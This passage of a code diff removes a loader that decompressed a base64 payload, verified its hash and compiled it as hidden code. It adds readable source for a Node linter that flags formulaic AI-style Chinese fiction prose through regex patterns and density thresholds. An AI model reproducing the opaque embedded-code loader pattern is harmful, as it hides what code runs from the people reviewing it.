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';
-const src=zlib.gunzipSync(Buffer.from(payload,'base64'));
-if(crypto.createHash('sha256').update(src).digest('hex')!=='d297fce88a4089989fe124f7f256bbf6ede6a614c0e6238ece1ae4a749eded71') throw new Error('embedded source checksum mismatch');
-const m=new Module(__filename,module.parent); m.filename=__filename; m.paths=module.paths; m._compile(src.toString('utf8'),__filename);
+
+const fs = require('fs');
+const { loadStyleWhitelist, maskStyleText } = require('./style-whitelist.js');
+const path = require('path');
+
+const USAGE = `Usage: node check-ai-patterns.js [--check] [--json] [--fail-on=blocking|all] <file...>
+
+Detect high-risk AI-flavor prose patterns that need human rewrite:
+  - negative setup followed by positive flip in the same sentence
+  - comma/semicolon/colon + positive flip
+  - sentence break + positive flip
+  - repeated negative setup followed by positive flip
+  - em-dash (按功能改写), 碎句号 (连续短叙述句), 长段落 (按镜头断段)
+  - 微动作复读 (「了下/了一下」式轻量补语高密度，电报体指纹)
+  - 套式反应细节 (指尖/指节/目光等无功能微动作与「平静得像在念」式语气比喻成片)
+  - 抽象总结复读 (命运/棋局/这一刻终于明白/才刚刚开始，AI 结尾腔)
+  - 套词密度过高 (仿佛/一丝/深吸一口气/平静无波等禁用词聚集)
+  - 比喻密度过高 (像/好像/仿佛/如同等比喻标记成片复现)
+  - 解释链密度过高 (知道/明白/这意味着/必须/需要等判断链聚集)
+  - 系统公告公文腔过密 (方括号系统/规则行里硬规则词聚集)
+  - 过度精炼短段 (长文本里短叙述段过密且自然连接偏少)
+  - 低连接密度 (引号外叙述功能词/白话连接偏少且中长句不足，像提纲/电报体)
+  - 监控摄像头式动作清单 (同段连续摆放动作动词，缺少视角温度/情绪缓冲)
+  - 音量反差腔 (声音不高/不大…却…, 实战漏网句式)
+  - 否定排比 (没有X，没有Y…连排 / 没X…只是Y 先否定后肯定, 实战漏网句式)
+  - 工整并列 (至于X不X，怎么X / 同动词「不V A，不V B」，含台词，advisory)
+  - 反序对比 (是A，不是B — not-is 的反序变种, 实战漏网句式)
+  - 预告式总结收尾 (文末窗口 没人知道/才刚刚开始/正朝着…压了过去, 实战漏网句式)
+  - 章尾状态总结体 (文末窗口 这一夜注定/这一切都结束了/新的人生才刚刚开始/命运的齿轮)
+  - 引号强调滥用 (叙述里 1-4 字短词加引号强调，密度型)
+
+Book-local .deslop-whitelist literal spans are excluded from style scanning (no regex or ancestor inheritance).
+Each finding carries severity: blocking by default for generation/deslop cleanup (not-is-comparison / em-dash / voice-contrast / negation-parade / reverse-not-is / trailer-ending / trailer-summary). This is a local style/readability gate, not an AIGC detector score; functional human text can be marked for review instead of hard-edited for a detector.
+或 advisory (period-stutter / long-paragraph / micro-action-tic / stock-reaction-tic / action-list-tic / action-sentence-parade / abstract-summary-tic / cliche-density-tic / metaphor-density-tic / reasoning-chain-tic / system-notice-formality-tic / overcompressed-prose-tic / low-connective-density-tic / quote-emphasis-tic / formulaic-parallelism，是提示，justified 的长推理/氛围段可保留)。
+--fail-on=blocking 只在出现 blocking finding 时退出 1；默认 --fail-on=all 有任何 finding 即退出 1。
+
+The script reports findings only. It never rewrites text, because the safe fix is
+contextual: usually delete the negative setup, write the positive term directly,
+or show it via action/detail.`;
+
+const STOP_CHARS = new Set(['。', '！', '？', '!', '?', '\n']);
+const SOFT_SEPARATORS = new Set(['，', ',', '、', '；', ';', '：', ':']);
+const HARD_SEPARATORS = new Set(['。', '.', '！', '!', '？', '?']);
+const MAX_NEGATIVE_SPAN = 80;
+const MAX_POSITIVE_SPAN = 80;
+
+// 碎句号：连续 STUTTER_MIN_RUN 个「叙述」短句（每句可见字数 ≤ STUTTER_MAX_SENTENCE）无呼吸。
+// 只数叙述句，跳过对话/弹幕/系统播报（成片短句是这些体裁的正常形态，不算碎句号）。
+const STUTTER_MIN_RUN = 6;
+const STUTTER_MAX_SENTENCE = 5;
+// 长段落：单段原始字符数超过阈值即提示按镜头断段（手机阅读保守阈值，正常单段远低于此）。
+const LONG_PARAGRAPH_CHARS = 200;
+
+// 微动作复读：「V了下 / V了一下 / 拍了两下 / 松了半圈」式轻量补语在叙述里高密度复现，
+// 容易形成删减过头的电报体指纹。只扫引号外叙述；密度与次数双门槛同时达标才报，
+// 单次出现是正常中文。
+const MICRO_TIC_PATTERN = /了(?:[一两三几半])?[下阵圈道声眼口气会]/g;
+const MICRO_TIC_MIN_HITS = 5;
+const MICRO_TIC_PER_KILO = 6;
+
+// 套式反应细节：不是禁写身体，而是提示成片出现的“部位 + 轻微动作/状态”、
+// “胸口像被撞了一下”、喉结/眼圈/声音放轻等通用情绪尾巴，以及“平静语气 +
+// 像在念/宣判”模板。此类句子词面变化大，不能逐词 blocking；按章聚集到 4 处才
+// advisory，要求逐处做删除测试。正常受伤、打斗、生理反应若承担物理后果可保留。
+const STOCK_REACTION_PATTERNS = [
+  /(?:指尖|手指|指节|手背|掌心|拳头|袖口|衣角|裙角|下唇|嘴唇|唇角|嘴角|眉头|眼底|眸光|目光|视线|肩膀|呼吸)[^。！？!?\n]{0,16}(?:轻轻|微微|缓缓|悄然|不自觉|无意识|下意识|攥紧|握紧|收紧|绞紧|泛白|发白|叩|敲|摩挲|抿紧|抿成|移开|垂下|躲开|一颤|颤了?一下|停了?一下|顿了?一下)/g,
+  /(?:语气|声音)[^。！？!?\n]{0,12}(?:平静|冷静|平淡|冷淡|淡漠|平直)[^。！？!?\n]{0,12}(?:像|仿佛|如同|好像)[^。！？!?\n]{0,16}(?:念|读|报|说|陈述|宣判|背诵)/g,
+  /(?:胸口|心口)[^。！？!?\n]{0,16}(?:像|仿佛|如同|好像)[^。！？!?\n]{0,16}(?:撞|锤|压|攥|堵)[^。！？!?\n]{0,8}(?:一下|一记|一拳)?/g,
+  /(?:声音|嗓音|语气)[^。！？!?\n]{0,12}(?:放轻|压低|发紧|发颤|很轻|轻了些)/g,
+  /(?:喉结|喉头|喉咙)[^。！？!?\n]{0,10}(?:滚|动|紧|堵|发涩|发干)/g,
+  /(?:眼眶|眼圈|鼻子)[^。！？!?\n]{0,8}(?:发红|红了|发热|发酸|一酸)/g,
+  /(?:抿了?下唇|抿了?抿唇|抿了?下嘴|抿着笑)/g,
+];
+const STOCK_REACTION_MIN_HITS = 4;
+// 校准（真人语料，<br> 已还原为换行）：qimao 长篇 5584 章 + heiyan 短篇整篇 3983 篇。
+// 长篇章尺度（中位约 2100 字）per-kilo 1.0→1.5 误报 0.43%→0.39%，几乎不动；
+// 短篇整篇 8000-20000 字下 MIN_HITS 形同虚设、只剩密度门，1.0 时误报 5.57%，
+// 1.5 降到 1.46%。故取 1.5，把两个总体拉到同一量级（四份副本共用一组阈值）。
+const STOCK_REACTION_PER_KILO = 1.5;
+
+// 监控摄像头式动作清单：同一段连续堆叠通用动作动词（伸手/拿起/取过/挑开/放下/转身等），
+// 且用逗号/顿号串联成步骤表时，读感像无视角温度的监控记录。只做 advisory；
+// 打斗/追逐等功能性动作编排可保留或人工复核。
+const ACTION_LIST_VERB_PATTERN = /伸手|抬手|探手|拿起|拿过|取出|取过|掏出|摸出|抓起|攥住|握住|捏住|按住|推开|拉开|打开|关上|放下|递给|挑开|掀开|扯开|拧开|倒出|端起|转身|回头|抬头|低头|弯腰|俯身|走到|走向|坐下|站起|看向|看着|盯着|扫过/g;
+const ACTION_LIST_MIN_HITS = 5;
+const ACTION_LIST_MIN_SEPARATORS = 4;
+
+// 动作句流水账（全文级）：抓"句句都是谁做了什么"的监控摄像头写法。
+// 与 action-list-tic 的分工：那个管"单段内动作动词堆叠"，这个管"叙述主干被
+// 动作短句挤满、缺叙述/心理/环境句间隔"。人物主语 + 短句 + 强动作动词即命中，
+// 心理句（想/觉得/知道/以为等）与状态句不算。打斗/追逐等功能性动作场面
+// 可保留或人工复核；只做 advisory。
+const PARADE_SUBJECT_PATTERN = /^(?:他|她|我|你|林骁|林晚晴|刘美兰|林超|师傅|男人|女人)/;
+const PARADE_MIND_TAIL = /(?:想|觉得|知道|以为|记得|确认|明白|怀疑|认为|发现|意识到|清楚|担心|害怕|说|问|听|看)[^，。！？]{0,10}$/;
+const PARADE_ACTION_ROOTS = '蹲|拽|拉|拿|掏|划|塞|放|端|转|回|推|关|开|拦|报|闭|摸|探|递|合|挂|点|倒|收|走|进|出|甩|扔|踢|踩|跳|扑|抓|攥|握|捏|拍|敲|抄|捡|提|扛|背|抱|拆|翻|盖|拧|掀|扯|撕|擦|洗|切';
+const PARADE_ACTION_PATTERN = new RegExp('(?:' + PARADE_ACTION_ROOTS + ')(?:住|着|了|起|下|上|出|进|开|到|回|来|去|完)');
+const PARADE_MIN_SENTENCES = 12;
+const PARADE_MIN_ACTION = 6;
+const PARADE_MIN_RATIO = 0.5;
+
+// 抽象总结复读：模板化段落常把角色当下经历拔成「命运/棋局/
+// 这一刻终于明白/才刚刚开始」的作者总结。单个词可能服务题材；高密度聚集才报。
+const ABSTRACT_SUMMARY_PATTERNS = [
+  /这一刻[，,]?[^\n。！？!?]{0,24}(?:终于|才)(?:明白|意识到)/g,
+  /从这一刻开始/g,
+  /(?:命运|宿命)[^\n。！？!?]{0,28}(?:齿轮|棋局|獠牙|改写|推向|安排)/g,
+  /早已[^\n。！？!?]{0,8}(?:布好|安排好)[^\n。！？!?]{0,8}(?:棋局|局)/g,
+  /前所未有的(?:决意|清醒|勇气|力量|恐惧|平静|信念)/g,
+  /(?:反击|复仇|战争|较量|故事|命运)[^\n。！？!?]{0,12}才刚刚开始/g,
+  /(?:新的开始|全新的开始)/g,
+];
+const ABSTRACT_SUMMARY_MIN_HITS = 3;
+const ABSTRACT_SUMMARY_PER_KILO = 4;
+
+// 套词密度：单个「仿佛/一丝」可能是正常中文，高密度聚集才会形成模板腔。
+// 词表只收本 repo banned-words 中已明确标为高危的形态，避免把普通功能词一网打尽。
+const CLICHE_PATTERNS = [
+  /仿佛|犹如|宛若|如同/g,
+  /一丝|一抹|些许|几分|隐约/g,
+  /深吸一口气|缓缓|微微|轻轻|淡淡/g,
+  /眼中闪过|嘴角勾起|眸光微微一闪|指节泛白|目光锐利|眼神锐利/g,
+  /心中涌起一股|心头一震|心中一动|心下了然|心中暗道|心中一凛/g,
+  /不容置疑|不容置喙|不易察觉|显而易见|毫无疑问|不可否认/g,
+  /声音不大[，,]?却带着|语气平静无波|平静无波|声音平直|听不出情绪/g,
+  /不知何时|唾手可得|无声翻涌|沉默(?:在[^。！？!?\n]{0,16})?蔓延|难以言说/g,
+  /散发着一股|冰冷的光|格外刺眼|深邃而冰冷/g,
+];
+const CLICHE_DENSITY_MIN_HITS = 8;
+const CLICHE_DENSITY_PER_KILO = 12;
+
+// 比喻密度：单个生活化比喻可服务画面；“像/好像/仿佛/如同”成片复现时，
+// 容易变成 AI 式修辞堆叠。只做 advisory，修法是删到必要数量并回到具体画面，
+// 不是把“像”换成另一组比喻词。
+const METAPHOR_MARKER_PATTERN = /好像|像是|仿佛|宛如|如同|犹如|(?<![不头图画影录摄肖])像(?![头像素])/g;
+const METAPHOR_LIKE_PHRASE_PATTERN = /(?:死|水|冰|火|潮水|石头|木头|机器|纸|铁|鬼|死人|刀|针|网|墙)一样/g;
+const METAPHOR_DENSITY_MIN_HITS = 7;
+const METAPHOR_DENSITY_PER_KILO = 3;
+
+// 解释链密度：常见“他知道/他明白/这意味着/必须需要”
+// 连续替读者推理，读感像报告。单个判断词可服务推理；高密度聚集才提示回到角色当下证据。
+const REASONING_CHAIN_PATTERNS = [
+  { key: 'mental', core: true, pattern: /(?<![不没未无])(?:他|她|我)?(?:知道|明白|意识到|清楚|判断|确认|分析)/g },
+  { key: 'connector', core: true, pattern: /这意味着|也就是说|换句话说|真正的问题(?:在于)?|问题在于|关键在于|在这种情况下|按照这个逻辑|只有这样|想到这里/g },
+  { key: 'modal', core: true, pattern: /(?:(?<!不)(?:必须|需要|应该|只要|就会|可能|可以|能够|无法)|不能)[^。！？!?\n]{0,16}(?:判断|确认|承担|维持|稳住|控制|扩大|失控|带来|造成|理解|默认|回家|进门|核对|筛选|减少|建立|风险|结果|秩序|责任)/g },
+  { key: 'abstract', core: false, pattern: /(?:任务|条件|风险|来源|逻辑|局面|结果|责任|秩序|规则|信息不足|决策能力)/g },
+];
+const REASONING_CHAIN_MIN_HITS = 8;
+const REASONING_CHAIN_CORE_MIN_HITS = 4;
+const REASONING_CHAIN_MIN_BUCKETS = 2;
+const REASONING_CHAIN_PER_KILO = 18;
+
+// 系统公告公文腔：只看成片方括号规则/面板行里的硬规则词。
+// 这不是特定题材词表；单条严肃规则、日常叙述或普通对话不触发。
+const NOTICE_FORMAL_PATTERNS = [
+  /不得|必须|不可|禁止|严禁|应当|须|需|务必/g,
+  /当前|本公告|本规则|本系统|提示|任务失败|临时权限|权限|状态|等级/g,
+  /维持|公共区域|秩序|优先|惩罚|处罚|违规|指令|执行/g,
+  /被视为|同样计入|计入|承担|责任|单位|撤回|转发|截图/g,
+];
+const NOTICE_FORMAL_CORE_PATTERN = /不得|必须|不可|禁止|严禁|应当|须|需|务必|被视为|同样计入|计入/g;
+const NOTICE_FORMAL_MIN_LINES = 4;
+const NOTICE_FORMAL_MIN_HITS = 12;
+const NOTICE_FORMAL_CORE_MIN_HITS = 5;
+const NOTICE_FORMAL_PER_KILO = 60;
+
+// 过度精炼短段：过度处理样本里常见大量 15 字以内叙述段，且“的/了/就/着/过/呢/吧/啊”等
+// 自然连接偏少；对照文本通常保留更多自然连接。此项只做 advisory，禁止机械注水。
+const OVERCOMPRESSED_PROSE_PARTICLE_PATTERN = /[的了就着过呢吧啊呀嘛]/g;
+const OVERCOMPRESSED_PROSE_MIN_CHARS = 1200;
+const OVERCOMPRESSED_PROSE_MIN_PARAS = 45;
+const OVERCOMPRESSED_PROSE_SHORT_MAX_CHARS = 15;
+const OVERCOMPRESSED_PROSE_SHORT_RATIO = 0.58;
+const OVERCOMPRESSED_PROSE_PARTICLE_PER_KILO = 85;
+
+// 低连接密度：单纯低功能词会误抓有大量中长句的文本；
+// 因此必须叠加“中长句不足”，并只看引号外叙述。这是 overcompressed 的短窗口补充，只做 advisory。
+const LOW_CONNECTIVE_FUNCTION_TERMS = ['的', '了', '就', '在', '是', '也', '都', '还', '又', '把', '被', '给', '这个', '那个', '里面', '以后', '时候', '现在', '因为', '所以', '但是', '不过', '然后', '已经', '还是', '起来', '出来', '下去'];
+const LOW_CONNECTIVE_PLAIN_TERMS = ['的', '了', '就', '也', '还', '又', '这个', '那个', '东西', '事情', '时候', '里面', '以后', '一下', '一点', '有点', '还是'];
+const LOW_CONNECTIVE_MIN_CHARS = 800;
+const LOW_CONNECTIVE_FUNCTION_PER_KILO = 100;
+const LOW_CONNECTIVE_PLAIN_PER_KILO = 65;
+const LOW_CONNECTIVE_LONG_SENTENCE_CHARS = 30;
+const LOW_CONNECTIVE_LONG_SENTENCE_RATIO = 0.08;
+
+// either-or「不是A就是B / 不是A也是B」里紧贴的「是」是连词的一部分，不是肯定项系动词。
+// 含「不」以沿用「不是A，也不是B」第二个否定段不算翻转的旧排除。
+const COMPACT_EITHER_OR_PREV = new Set(['不', '就', '也']);
+// 句尾语气/反问助词；「…，是吗 / 是吧 / 是嘛」是反问尾巴，不是否定后的肯定翻转。
+const TAG_PARTICLES = new Set(['吗', '吧', '嘛']);
+// 段首确认语；「不是第一次来。是的，他还记得……」里的「是的/是啊」
+// 是承接确认，不是「不是 A，是 B」的肯定翻转。
+const AFFIRMATION_TAG_PARTICLES = new Set(['的', '啊', '呀', '呢']);
+const AFFIRMATION_TAG_BOUNDARY = new Set(['', '，', ',', '。', '.', '！', '!', '？', '?', '、', '；', ';', '：', ':', '\n', '\r', '\t', ' ']);
+
+// 成对引号（台词/系统播报/弹幕）的字符对，stripQuoted 与 quotedRanges 共用一份来源。
+// 引号片段一律不跨行（字符类里排掉 \n）：正文漏一个收引号很常见（多段台词只在末段收尾、
+// 全半角引号混用都会漏），若允许跨行配对，一个未闭合的开引号会把后面成百上千字全算成
+// 「引号内」，让 quotedRanges 的消费方（not-is 跨行扫描）把整段叙述静默豁免掉。
+const QUOTE_PAIRS = [['「', '」'], ['『', '』'], ['【', '】'], ['“', '”'], ['‘', '’'], ['"', '"'], ["'", "'"]];
+const QUOTE_SOURCES = QUOTE_PAIRS.map(([open, close]) => `${escapeRegExp(open)}[^${escapeRegExpCharClass(close)}\\n]*${escapeRegExp(close)}`);
+
+// ---- 实战测试漏网句式（来源：实战写作抓到的真实漏网例句；2026-07 校准）----
+// 校准基线：《万疆》真人正文 20 章（第1/10/20/…/190章）+ demo 前 20 章。
+// blocking 规则要求真人语料命中 ≈0（每 20 章 ≤1 处且人工判定确属该句式）；数据见各规则注释。
+
+// 音量反差腔（实战漏网 A）：「声音不高，第一句却稳稳压住了整个大厅。」
+// 旧网只有套词密度桶里的「声音不大，却带着」，音量词/转折词一换就漏。
+// 引号外叙述逐处 blocking；修法是删掉音量铺垫，直接写声音落进场子的具体效果。
+// 校准：《万疆》20 章 0 命中，demo 前 20 章 0 命中。
+const VOICE_CONTRAST_PATTERN = /声音(?:并)?不[大高响亮][^。！？!?\n]{0,16}[却但偏]/g;
+
+// 否定排比（实战漏网 B）：「没有伴奏，没有和声，没有提词器。」同句 ≥2 个「没有X，」连排；
+// 变体「他没炫技，没有那种…架势。他只是唱」先否定铺垫、再用「只是/只会/只有」收肯定。
+// 只收「没/没有」段，不收「不X」段——真人叙述里「不哭不闹」类太常见，收进来误报换不来收益。
+// 光杆「没」还得挡两类非否定用法，否则正常叙述会被判成排比：
+//   1) 黏着语素（沉没/淹没/埋没/出没/隐没…）——前字排除，「船沉没在雾里，没人回头，…只有…」不算；
+//   2) 时间惯用语（没多久/没过多久/没等X）——后字排除，「没多久，没等她撑伞，…只有…」不算。
+// 「没有X」段不带这两种歧义（黏着语素后接不出「有」，时间惯用语已被后字排除覆盖），
+// 第一条连排式照旧不加护栏。
+// 校准：《万疆》20 章 0 命中，demo 前 20 章 0 命中。
+const NEGATION_PARADE_PATTERNS = [
+  /(?:没有[^。！？!?\n，,]{1,12}[，,]){2}/g,
+  /(?<![沉淹埋出隐湮吞覆漫泯])没(?!有?过?多久)(?:有)?[^。！？!?\n，,]{1,12}[，,]\s*没(?!有?过?多久)(?:有)?[^。！？!?\n，,]{1,16}[，,。.][^。！？!?\n，,]{0,6}只(?:是|会|有)/g,
+];
+const CROSS_NEGATION_START = /^不是[^。！？!?\n]{1,24}[。！？!?]?$/;
+const CROSS_NEGATION_MIDDLE = /^(?:也|还)不是[^。！？!?\n]{1,24}[。！？!?]?$/;
+const CROSS_NEGATION_END = /^只是[^。！？!?\n]{1,32}[。！？!?]?$/;
+
+// 两类常见但不能直接判错的工整框架，只做 advisory。与 blocking 规则不同，这里故意扫描
+// 台词：自然点单「不放辣，不放葱」靠对象最短长度排除；更长的同动词清单交语义审查判断功能。
+const DECISION_FRAME_PATTERN = /至于([\u3400-\u9fff]{1,3})不\1[，,]\s*怎么\1/g;
+const REPEATED_NEGATIVE_VERB_PATTERN = /不([\u3400-\u9fff]{1,2})([\u3400-\u9fff]{2,8})[，,]\s*不\1([\u3400-\u9fff]{2,8})/g;
+
+// 反序对比腔（实战漏网 C）：「是真嗓子，不是修音修出来的」——not-is-comparison 的反序变种。
+// 复用 not-is 的排除基建：引号内剥离（maskQuoted）、「是的/是啊」确认语（isAffirmationTagAt）；
+// 前字排除从 either-or 的 不/就/也 扩展到全部「X是」连词/副词合成词（还是/只是/可是/但是/
+// 于是/倒是/像是/若是/要是/正是/便是/总是/老是/更是/最是/算是/怕是/凡是/或是/即是/自是/
+// 竟是/原是/本是/仍是/许是/净是/光是/单是/尽是）；「是不是」问句起头与「不是吗/不是么/
+// 不是吧」反问尾巴单独排除。
+// 校准：《万疆》20 章 0 命中，demo 前 20 章 0 命中，按 blocking 实现。
+const REVERSE_NOT_IS_PATTERN = /是([^。！？!?\n，,]{1,12})[，,]\s*(?:而)?不是([^。！？!?\n]{1,20})/g;
+const REVERSE_NOT_IS_PREV_EXCLUDE = new Set([...COMPACT_EITHER_OR_PREV, '还', '只', '可', '但', '于', '倒', '像', '若', '要', '正', '便', '总', '老', '更', '最', '算', '怕', '凡', '或', '即', '自', '竟', '原', '本', '仍', '许', '净', '光', '单', '尽']);
+
+// 预告式总结收尾（实战漏网 D）：「没人知道，这才刚刚开头。」「一场…震惊接力，正朝着…缓缓压了过去。」
+// 章尾替读者预告下一章走向是 AI 收尾腔。只扫文末窗口（剥引号后可见字数，按行取整），
+// 正文中段的「没人知道」多为普通叙述，不误伤；引号内台词（「没人知道…」）不计。
+// 「正式拉开序幕/帷幕」是场内事件的报幕式陈述（真人语料「钟声再度响起，比赛正式拉开序幕」），
+// 不是叙述者预告，前置 lookbehind 排除。
+// 校准：《万疆》20 章排除「正式拉开序幕」2 处报幕句后 0 命中，demo 前 20 章 0 命中。
+const TRAILER_ENDING_PATTERN = /没人知道|谁也不知道|谁也没想到|殊不知|(?:这)?才刚刚开(?:始|头)|正(?:朝着|向着)[^。！？!?\n]{0,24}(?:压|涌|袭|逼)(?:了?过去|了?过来|来)|(?<!正式)拉开(?:序幕|帷幕)|即将(?:开始|来临|降临)/g;
+const TRAILER_ENDING_WINDOW_CHARS = 600;
+
+// 章尾状态总结体：把细纲「结尾设定/收束状态」原样写成总结句收章（「这一夜注定无人入眠」
+// 「这一切都结束了」「新的人生才刚刚开始」「命运的齿轮」）。与 trailer-ending 共用文末窗口，
+// 区别是它盖章过去、trailer-ending 预告将来；收的都是 banned-words 已按名禁掉的形态。
+// 不收「(这|那)一刻…终于明白」：真人语料里那是正常的认知节拍，短篇第一人称审判句还是卖点
+// （short-craft「审判金句 / 心死余韵」），密度型由 advisory 的 abstract-summary-tic 兜。
+// 各分支都要求落在句末断言位，否则会吃进条件从句（等这一切结束了，我们就…）、动补
+// （这一切都说明得非常清楚）、成语跨匹配（这一刻…命中注定）、系表（这一战的结果是注定的）、
+// 及物用法（就这样…才结束了这个话题）、场内报幕（就这样…宣布…圆满落幕）和否定认知
+// （他不知道这一切意味着什么）——最后一类靠 (?!什么) 排掉间接疑问，那是盖章的反面。
+// 校准（文末 600 字窗口，命中逐条人工复核）：qimao 章中段 20000 章命中 1 处（0.005%）、
+// heiyan 整篇 3999 篇命中 22 处（0.550%，全部是上列禁用形态）；同批既有 trailer-ending
+// 分别命中 1.345% / 6.602%——本规则误报面显著小于已上线的同窗口规则。短篇整篇即收口，
+// 基线天然高于长篇章中段，故两个总体分别报数。
